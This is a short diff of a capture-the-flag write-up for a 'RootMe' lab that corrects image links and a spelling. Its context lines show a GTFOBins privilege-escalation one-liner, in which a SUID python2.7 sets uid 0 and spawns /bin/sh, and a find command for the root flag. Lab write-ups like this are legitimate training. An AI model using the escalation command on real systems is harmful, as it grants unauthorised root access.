@@ -100,11 +100,11 @@ we can use GTFO bins to get the program python to escalate privilages
 command used: python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 "/bin/sh" gives a shell
 
-![Privilege Escalation](images/rootme/privilage%20escalation.png)
+![Privilege Escalation](images/rootme/privilege%20escalation.png)
 we are now root user
 command used: find / -type f -name root.txt 2> /dev/null
 
-![[Pasted image 20260318163906.png]]
+![Root Flag Captured](images/rootme/root%20flag%20captured.png)
 
 OVERVIEW
 
